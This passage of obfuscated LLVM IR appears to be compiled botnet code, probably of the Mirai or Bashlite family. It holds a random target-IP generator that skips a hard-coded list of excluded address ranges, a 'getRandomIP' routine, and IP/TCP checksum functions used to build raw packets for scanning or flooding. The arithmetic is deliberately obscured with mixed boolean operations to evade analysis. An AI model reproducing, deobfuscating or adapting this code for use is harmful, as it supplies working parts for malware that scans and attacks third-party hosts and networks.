  %231 = icmp eq i32 %230, 185
  br i1 %231, label %232, label %240

; <label>:232:                                    ; preds = %228
  %233 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %234 = zext i8 %233 to i32
  %235 = icmp eq i32 %234, 61
  br i1 %235, label %236, label %240

; <label>:236:                                    ; preds = %232
  %237 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %238 = zext i8 %237 to i32
  %239 = icmp eq i32 %238, 136
  br i1 %239, label %540, label %240

; <label>:240:                                    ; preds = %236, %232, %228
  %241 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %242 = zext i8 %241 to i32
  %243 = icmp eq i32 %242, 185
  br i1 %243, label %244, label %252

; <label>:244:                                    ; preds = %240
  %245 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %246 = zext i8 %245 to i32
  %247 = icmp eq i32 %246, 11
  br i1 %247, label %248, label %252

; <label>:248:                                    ; preds = %244
  %249 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %250 = zext i8 %249 to i32
  %251 = icmp eq i32 %250, 147
  br i1 %251, label %540, label %252

; <label>:252:                                    ; preds = %248, %244, %240
  %253 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %254 = zext i8 %253 to i32
  %255 = icmp eq i32 %254, 185
  br i1 %255, label %256, label %264

; <label>:256:                                    ; preds = %252
  %257 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %258 = zext i8 %257 to i32
  %259 = icmp eq i32 %258, 11
  br i1 %259, label %260, label %264

; <label>:260:                                    ; preds = %256
  %261 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %262 = zext i8 %261 to i32
  %263 = icmp eq i32 %262, 146
  br i1 %263, label %540, label %264

; <label>:264:                                    ; preds = %260, %256, %252
  %265 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %266 = zext i8 %265 to i32
  %267 = icmp eq i32 %266, 185
  br i1 %267, label %268, label %276

; <label>:268:                                    ; preds = %264
  %269 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 11
  br i1 %271, label %272, label %276

; <label>:272:                                    ; preds = %268
  %273 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %274 = zext i8 %273 to i32
  %275 = icmp eq i32 %274, 145
  br i1 %275, label %540, label %276

; <label>:276:                                    ; preds = %272, %268, %264
  %277 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %278 = zext i8 %277 to i32
  %279 = icmp eq i32 %278, 63
  br i1 %279, label %280, label %288

; <label>:280:                                    ; preds = %276
  %281 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 141
  br i1 %283, label %284, label %288

; <label>:284:                                    ; preds = %280
  %285 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %286 = zext i8 %285 to i32
  %287 = icmp eq i32 %286, 241
  br i1 %287, label %540, label %288

; <label>:288:                                    ; preds = %284, %280, %276
  %289 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %290 = zext i8 %289 to i32
  %291 = icmp eq i32 %290, 69
  br i1 %291, label %292, label %300

; <label>:292:                                    ; preds = %288
  %293 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %294 = zext i8 %293 to i32
  %295 = icmp eq i32 %294, 30
  br i1 %295, label %296, label %300

; <label>:296:                                    ; preds = %292
  %297 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %298 = zext i8 %297 to i32
  %299 = icmp eq i32 %298, 192
  br i1 %299, label %540, label %300

; <label>:300:                                    ; preds = %296, %292, %288
  %301 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %302 = zext i8 %301 to i32
  %303 = icmp eq i32 %302, 69
  br i1 %303, label %304, label %312

; <label>:304:                                    ; preds = %300
  %305 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %306 = zext i8 %305 to i32
  %307 = icmp eq i32 %306, 30
  br i1 %307, label %308, label %312

; <label>:308:                                    ; preds = %304
  %309 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %310 = zext i8 %309 to i32
  %311 = icmp eq i32 %310, 244
  br i1 %311, label %540, label %312

; <label>:312:                                    ; preds = %308, %304, %300
  %313 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %314 = zext i8 %313 to i32
  %315 = icmp eq i32 %314, 69
  br i1 %315, label %316, label %324

; <label>:316:                                    ; preds = %312
  %317 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %318 = zext i8 %317 to i32
  %319 = icmp eq i32 %318, 197
  br i1 %319, label %320, label %324

; <label>:320:                                    ; preds = %316
  %321 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %322 = zext i8 %321 to i32
  %323 = icmp eq i32 %322, 128
  br i1 %323, label %540, label %324

; <label>:324:                                    ; preds = %320, %316, %312
  %325 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %326 = zext i8 %325 to i32
  %327 = icmp eq i32 %326, 162
  br i1 %327, label %328, label %336

; <label>:328:                                    ; preds = %324
  %329 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %330 = zext i8 %329 to i32
  %331 = icmp eq i32 %330, 251
  br i1 %331, label %332, label %336

; <label>:332:                                    ; preds = %328
  %333 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %334 = zext i8 %333 to i32
  %335 = icmp eq i32 %334, 120
  br i1 %335, label %540, label %336

; <label>:336:                                    ; preds = %332, %328, %324
  %337 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %338 = zext i8 %337 to i32
  %339 = icmp eq i32 %338, 173
  br i1 %339, label %340, label %348

; <label>:340:                                    ; preds = %336
  %341 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %342 = zext i8 %341 to i32
  %343 = icmp eq i32 %342, 208
  br i1 %343, label %344, label %348

; <label>:344:                                    ; preds = %340
  %345 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %346 = zext i8 %345 to i32
  %347 = icmp eq i32 %346, 128
  br i1 %347, label %540, label %348

; <label>:348:                                    ; preds = %344, %340, %336
  %349 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %350 = zext i8 %349 to i32
  %351 = icmp eq i32 %350, 173
  br i1 %351, label %352, label %360

; <label>:352:                                    ; preds = %348
  %353 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %354 = zext i8 %353 to i32
  %355 = icmp eq i32 %354, 208
  br i1 %355, label %356, label %360

; <label>:356:                                    ; preds = %352
  %357 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %358 = zext i8 %357 to i32
  %359 = icmp eq i32 %358, 180
  br i1 %359, label %540, label %360

; <label>:360:                                    ; preds = %356, %352, %348
  %361 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %362 = zext i8 %361 to i32
  %363 = icmp eq i32 %362, 173
  br i1 %363, label %364, label %372

; <label>:364:                                    ; preds = %360
  %365 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %366 = zext i8 %365 to i32
  %367 = icmp eq i32 %366, 208
  br i1 %367, label %368, label %372

; <label>:368:                                    ; preds = %364
  %369 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %370 = zext i8 %369 to i32
  %371 = icmp eq i32 %370, 250
  br i1 %371, label %540, label %372

; <label>:372:                                    ; preds = %368, %364, %360
  %373 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %374 = zext i8 %373 to i32
  %375 = icmp eq i32 %374, 192
  br i1 %375, label %376, label %384

; <label>:376:                                    ; preds = %372
  %377 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %378 = zext i8 %377 to i32
  %379 = icmp eq i32 %378, 187
  br i1 %379, label %380, label %384

; <label>:380:                                    ; preds = %376
  %381 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %382 = zext i8 %381 to i32
  %383 = icmp eq i32 %382, 113
  br i1 %383, label %540, label %384

; <label>:384:                                    ; preds = %380, %376, %372
  %385 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %386 = zext i8 %385 to i32
  %387 = icmp eq i32 %386, 198
  br i1 %387, label %388, label %396

; <label>:388:                                    ; preds = %384
  %389 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %390 = zext i8 %389 to i32
  %391 = icmp eq i32 %390, 204
  br i1 %391, label %392, label %396

; <label>:392:                                    ; preds = %388
  %393 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %394 = zext i8 %393 to i32
  %395 = icmp eq i32 %394, 241
  br i1 %395, label %540, label %396

; <label>:396:                                    ; preds = %392, %388, %384
  %397 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %398 = zext i8 %397 to i32
  %399 = icmp eq i32 %398, 204
  br i1 %399, label %400, label %408

; <label>:400:                                    ; preds = %396
  %401 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %402 = zext i8 %401 to i32
  %403 = icmp eq i32 %402, 10
  br i1 %403, label %404, label %408

; <label>:404:                                    ; preds = %400
  %405 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %406 = zext i8 %405 to i32
  %407 = icmp eq i32 %406, 160
  br i1 %407, label %540, label %408

; <label>:408:                                    ; preds = %404, %400, %396
  %409 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %410 = zext i8 %409 to i32
  %411 = icmp eq i32 %410, 204
  br i1 %411, label %412, label %420

; <label>:412:                                    ; preds = %408
  %413 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %414 = zext i8 %413 to i32
  %415 = icmp eq i32 %414, 12
  br i1 %415, label %416, label %420

; <label>:416:                                    ; preds = %412
  %417 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %418 = zext i8 %417 to i32
  %419 = icmp eq i32 %418, 192
  br i1 %419, label %540, label %420

; <label>:420:                                    ; preds = %416, %412, %408
  %421 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %422 = zext i8 %421 to i32
  %423 = icmp eq i32 %422, 208
  br i1 %423, label %424, label %432

; <label>:424:                                    ; preds = %420
  %425 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %426 = zext i8 %425 to i32
  %427 = icmp eq i32 %426, 110
  br i1 %427, label %428, label %432

; <label>:428:                                    ; preds = %424
  %429 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %430 = zext i8 %429 to i32
  %431 = icmp eq i32 %430, 64
  br i1 %431, label %540, label %432

; <label>:432:                                    ; preds = %428, %424, %420
  %433 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %434 = zext i8 %433 to i32
  %435 = icmp eq i32 %434, 208
  br i1 %435, label %436, label %444

; <label>:436:                                    ; preds = %432
  %437 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %438 = zext i8 %437 to i32
  %439 = icmp eq i32 %438, 110
  br i1 %439, label %440, label %444

; <label>:440:                                    ; preds = %436
  %441 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %442 = zext i8 %441 to i32
  %443 = icmp eq i32 %442, 72
  br i1 %443, label %540, label %444

; <label>:444:                                    ; preds = %440, %436, %432
  %445 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %446 = zext i8 %445 to i32
  %447 = icmp eq i32 %446, 208
  br i1 %447, label %448, label %452

; <label>:448:                                    ; preds = %444
  %449 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %450 = zext i8 %449 to i32
  %451 = icmp eq i32 %450, 67
  br i1 %451, label %540, label %452

; <label>:452:                                    ; preds = %448, %444
  %453 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %454 = zext i8 %453 to i32
  %455 = icmp eq i32 %454, 94
  br i1 %455, label %456, label %464

; <label>:456:                                    ; preds = %452
  %457 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %458 = zext i8 %457 to i32
  %459 = icmp eq i32 %458, 102
  br i1 %459, label %460, label %464

; <label>:460:                                    ; preds = %456
  %461 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %462 = zext i8 %461 to i32
  %463 = icmp eq i32 %462, 48
  br i1 %463, label %540, label %464

; <label>:464:                                    ; preds = %460, %456, %452
  %465 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %466 = zext i8 %465 to i32
  %467 = icmp eq i32 %466, 93
  br i1 %467, label %468, label %476

; <label>:468:                                    ; preds = %464
  %469 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %470 = zext i8 %469 to i32
  %471 = icmp eq i32 %470, 174
  br i1 %471, label %472, label %476

; <label>:472:                                    ; preds = %468
  %473 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %474 = zext i8 %473 to i32
  %475 = icmp eq i32 %474, 88
  br i1 %475, label %540, label %476

; <label>:476:                                    ; preds = %472, %468, %464
  %477 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %478 = zext i8 %477 to i32
  %479 = icmp eq i32 %478, 89
  br i1 %479, label %480, label %488

; <label>:480:                                    ; preds = %476
  %481 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %482 = zext i8 %481 to i32
  %483 = icmp eq i32 %482, 248
  br i1 %483, label %484, label %488

; <label>:484:                                    ; preds = %480
  %485 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %486 = zext i8 %485 to i32
  %487 = icmp eq i32 %486, 174
  br i1 %487, label %540, label %488

; <label>:488:                                    ; preds = %484, %480, %476
  %489 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %490 = zext i8 %489 to i32
  %491 = icmp eq i32 %490, 89
  br i1 %491, label %492, label %500

; <label>:492:                                    ; preds = %488
  %493 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %494 = zext i8 %493 to i32
  %495 = icmp eq i32 %494, 248
  br i1 %495, label %496, label %500

; <label>:496:                                    ; preds = %492
  %497 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %498 = zext i8 %497 to i32
  %499 = icmp eq i32 %498, 172
  br i1 %499, label %540, label %500

; <label>:500:                                    ; preds = %496, %492, %488
  %501 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %502 = zext i8 %501 to i32
  %503 = icmp eq i32 %502, 89
  br i1 %503, label %504, label %512

; <label>:504:                                    ; preds = %500
  %505 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %506 = zext i8 %505 to i32
  %507 = icmp eq i32 %506, 248
  br i1 %507, label %508, label %512

; <label>:508:                                    ; preds = %504
  %509 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %510 = zext i8 %509 to i32
  %511 = icmp eq i32 %510, 170
  br i1 %511, label %540, label %512

; <label>:512:                                    ; preds = %508, %504, %500
  %513 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %514 = zext i8 %513 to i32
  %515 = icmp eq i32 %514, 89
  br i1 %515, label %516, label %524

; <label>:516:                                    ; preds = %512
  %517 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %518 = zext i8 %517 to i32
  %519 = icmp eq i32 %518, 248
  br i1 %519, label %520, label %524

; <label>:520:                                    ; preds = %516
  %521 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %522 = zext i8 %521 to i32
  %523 = icmp eq i32 %522, 169
  br i1 %523, label %540, label %524

; <label>:524:                                    ; preds = %520, %516, %512
  %525 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %526 = zext i8 %525 to i32
  %527 = icmp eq i32 %526, 89
  br i1 %527, label %528, label %536

; <label>:528:                                    ; preds = %524
  %529 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %530 = zext i8 %529 to i32
  %531 = icmp eq i32 %530, 248
  br i1 %531, label %532, label %536

; <label>:532:                                    ; preds = %528
  %533 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %534 = zext i8 %533 to i32
  %535 = icmp eq i32 %534, 160
  br i1 %535, label %540, label %536

; <label>:536:                                    ; preds = %532, %528, %524
  %537 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %538 = zext i8 %537 to i32
  %539 = icmp sge i32 %538, 224
  br label %540

; <label>:540:                                    ; preds = %536, %532, %520, %508, %496, %484, %472, %460, %448, %440, %428, %416, %404, %392, %380, %368, %356, %344, %332, %320, %308, %296, %284, %272, %260, %248, %236, %224, %212, %200, %188, %176, %164, %152, %140, %128, %124, %116, %108, %96, %84, %72, %64, %60, %48, %44
  %541 = phi i1 [ true, %532 ], [ true, %520 ], [ true, %508 ], [ true, %496 ], [ true, %484 ], [ true, %472 ], [ true, %460 ], [ true, %448 ], [ true, %440 ], [ true, %428 ], [ true, %416 ], [ true, %404 ], [ true, %392 ], [ true, %380 ], [ true, %368 ], [ true, %356 ], [ true, %344 ], [ true, %332 ], [ true, %320 ], [ true, %308 ], [ true, %296 ], [ true, %284 ], [ true, %272 ], [ true, %260 ], [ true, %248 ], [ true, %236 ], [ true, %224 ], [ true, %212 ], [ true, %200 ], [ true, %188 ], [ true, %176 ], [ true, %164 ], [ true, %152 ], [ true, %140 ], [ true, %128 ], [ true, %124 ], [ true, %116 ], [ true, %108 ], [ true, %96 ], [ true, %84 ], [ true, %72 ], [ true, %64 ], [ true, %60 ], [ true, %48 ], [ true, %44 ], [ %539, %536 ]
  br i1 %541, label %542, label %555

; <label>:542:                                    ; preds = %540
  %543 = call i32 @rand() #2
  %544 = srem i32 %543, 255
  %545 = trunc i32 %544 to i8
  store i8 %545, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %546 = call i32 @rand() #2
  %547 = srem i32 %546, 255
  %548 = trunc i32 %547 to i8
  store i8 %548, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %549 = call i32 @rand() #2
  %550 = srem i32 %549, 255
  %551 = trunc i32 %550 to i8
  store i8 %551, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %552 = call i32 @rand() #2
  %553 = srem i32 %552, 255
  %554 = trunc i32 %553 to i8
  store i8 %554, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  br label %44

; <label>:555:                                    ; preds = %540
  %556 = bitcast [16 x i8]* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %556, i8 0, i64 16, i32 16, i1 false)
  %557 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %558 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 0), align 1
  %559 = zext i8 %558 to i32
  %560 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 1), align 1
  %561 = zext i8 %560 to i32
  %562 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 2), align 1
  %563 = zext i8 %562 to i32
  %564 = load i8, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @ipState, i64 0, i64 3), align 1
  %565 = zext i8 %564 to i32
  %566 = call i32 (i8*, i8*, ...) @szprintf(i8* %557, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.46, i32 0, i32 0), i32 %559, i32 %561, i32 %563, i32 %565)
  %567 = getelementptr inbounds [16 x i8], [16 x i8]* %3, i32 0, i32 0
  %568 = call i32 @inet_addr(i8* %567) #2
  store i32 %568, i32* %1, align 4
  br label %569

; <label>:569:                                    ; preds = %555, %11
  %570 = load i32, i32* %1, align 4
  ret i32 %570
}

; Function Attrs: nounwind
declare i32 @rand() #4

; Function Attrs: noinline nounwind uwtable
define i32 @getRandomIP(i32) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  store i32 %0, i32* %2, align 4
  %4 = load i32, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %5 = call i32 @ntohl(i32 %4) #13
  %6 = load i32, i32* %2, align 4
  %7 = xor i32 %5, -1
  %8 = xor i32 %6, -1
  %9 = xor i32 892404701, -1
  %10 = or i32 %7, %8
  %11 = or i32 892404701, %9
  %12 = xor i32 %10, -1
  %13 = and i32 %12, %11
  %14 = and i32 %5, %6
  store i32 %13, i32* %3, align 4
  %15 = load i32, i32* %3, align 4
  %16 = call i32 @rand_cmwc()
  %17 = load i32, i32* %2, align 4
  %18 = xor i32 %17, -1
  %19 = and i32 1105014122, %18
  %20 = xor i32 1105014122, -1
  %21 = and i32 %17, %20
  %22 = xor i32 -1, -1
  %23 = and i32 %22, 1105014122
  %24 = and i32 -1, %20
  %25 = or i32 %19, %21
  %26 = or i32 %23, %24
  %27 = xor i32 %25, %26
  %28 = xor i32 %17, -1
  %29 = xor i32 %16, -1
  %30 = xor i32 %27, -1
  %31 = xor i32 -445946452, -1
  %32 = or i32 %29, %30
  %33 = or i32 -445946452, %31
  %34 = xor i32 %32, -1
  %35 = and i32 %34, %33
  %36 = and i32 %16, %27
  %37 = xor i32 %15, -1
  %38 = and i32 1035797964, %37
  %39 = xor i32 1035797964, -1
  %40 = and i32 %15, %39
  %41 = xor i32 %35, -1
  %42 = and i32 %41, 1035797964
  %43 = and i32 %35, %39
  %44 = or i32 %38, %40
  %45 = or i32 %42, %43
  %46 = xor i32 %44, %45
  %47 = xor i32 %15, %35
  ret i32 %46
}

; Function Attrs: nounwind readnone
declare i32 @ntohl(i32) #8

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @csum(i16*, i32) #0 {
  %3 = alloca i16*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i64, align 8
  store i16* %0, i16** %3, align 8
  store i32 %1, i32* %4, align 4
  store i64 0, i64* %5, align 8
  br label %6

; <label>:6:                                      ; preds = %9, %2
  %7 = load i32, i32* %4, align 4
  %8 = icmp sgt i32 %7, 1
  br i1 %8, label %9, label %23

; <label>:9:                                      ; preds = %6
  %10 = load i16*, i16** %3, align 8
  %11 = getelementptr inbounds i16, i16* %10, i32 1
  store i16* %11, i16** %3, align 8
  %12 = load i16, i16* %10, align 2
  %13 = zext i16 %12 to i64
  %14 = load i64, i64* %5, align 8
  %15 = sub i64 0, %13
  %16 = sub i64 %14, %15
  %17 = add i64 %14, %13
  store i64 %16, i64* %5, align 8
  %18 = load i32, i32* %4, align 4
  %19 = sub i32 %18, -631734800
  %20 = sub i32 %19, 2
  %21 = add i32 %20, -631734800
  %22 = sub nsw i32 %18, 2
  store i32 %21, i32* %4, align 4
  br label %6

; <label>:23:                                     ; preds = %6
  %24 = load i32, i32* %4, align 4
  %25 = icmp sgt i32 %24, 0
  br i1 %25, label %26, label %35

; <label>:26:                                     ; preds = %23
  %27 = load i16*, i16** %3, align 8
  %28 = bitcast i16* %27 to i8*
  %29 = load i8, i8* %28, align 1
  %30 = zext i8 %29 to i64
  %31 = load i64, i64* %5, align 8
  %32 = sub i64 0, %30
  %33 = sub i64 %31, %32
  %34 = add i64 %31, %30
  store i64 %33, i64* %5, align 8
  br label %35

; <label>:35:                                     ; preds = %26, %23
  br label %36

; <label>:36:                                     ; preds = %40, %35
  %37 = load i64, i64* %5, align 8
  %38 = lshr i64 %37, 16
  %39 = icmp ne i64 %38, 0
  br i1 %39, label %40, label %52

; <label>:40:                                     ; preds = %36
  %41 = load i64, i64* %5, align 8
  %42 = xor i64 65535, -1
  %43 = xor i64 %41, %42
  %44 = and i64 %43, %41
  %45 = and i64 %41, 65535
  %46 = load i64, i64* %5, align 8
  %47 = lshr i64 %46, 16
  %48 = add i64 %44, 4274239111756102575
  %49 = add i64 %48, %47
  %50 = sub i64 %49, 4274239111756102575
  %51 = add i64 %44, %47
  store i64 %50, i64* %5, align 8
  br label %36

; <label>:52:                                     ; preds = %36
  %53 = load i64, i64* %5, align 8
  %54 = xor i64 %53, -1
  %55 = and i64 4492407995946285991, %54
  %56 = xor i64 4492407995946285991, -1
  %57 = and i64 %53, %56
  %58 = xor i64 -1, -1
  %59 = and i64 %58, 4492407995946285991
  %60 = and i64 -1, %56
  %61 = or i64 %55, %57
  %62 = or i64 %59, %60
  %63 = xor i64 %61, %62
  %64 = xor i64 %53, -1
  %65 = trunc i64 %63 to i16
  ret i16 %65
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr*, %struct.tcphdr*) #0 {
  %3 = alloca %struct.iphdr*, align 8
  %4 = alloca %struct.tcphdr*, align 8
  %5 = alloca %struct.tcp_pseudo, align 8
  %6 = alloca i16, align 2
  %7 = alloca i32, align 4
  %8 = alloca i16*, align 8
  %9 = alloca i16, align 2
  store %struct.iphdr* %0, %struct.iphdr** %3, align 8
  store %struct.tcphdr* %1, %struct.tcphdr** %4, align 8
  %10 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %11 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %10, i32 0, i32 2
  %12 = load i16, i16* %11, align 2
  store i16 %12, i16* %6, align 2
  %13 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %13, i32 0, i32 8
  %15 = load i32, i32* %14, align 4
  %16 = zext i32 %15 to i64
  %17 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 0
  store i64 %16, i64* %17, align 8
  %18 = load %struct.iphdr*, %struct.iphdr** %3, align 8
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %18, i32 0, i32 9
  %20 = load i32, i32* %19, align 4
  %21 = zext i32 %20 to i64
  %22 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 1
  store i64 %21, i64* %22, align 8
  %23 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 2
  store i8 0, i8* %23, align 8
  %24 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 3
  store i8 6, i8* %24, align 1
  %25 = call zeroext i16 @htons(i16 zeroext 20) #13
  %26 = getelementptr inbounds %struct.tcp_pseudo, %struct.tcp_pseudo* %5, i32 0, i32 4
  store i16 %25, i16* %26, align 2
  store i32 44, i32* %7, align 4
  %27 = load i32, i32* %7, align 4
  %28 = sext i32 %27 to i64
  %29 = call noalias i8* @malloc(i64 %28) #2
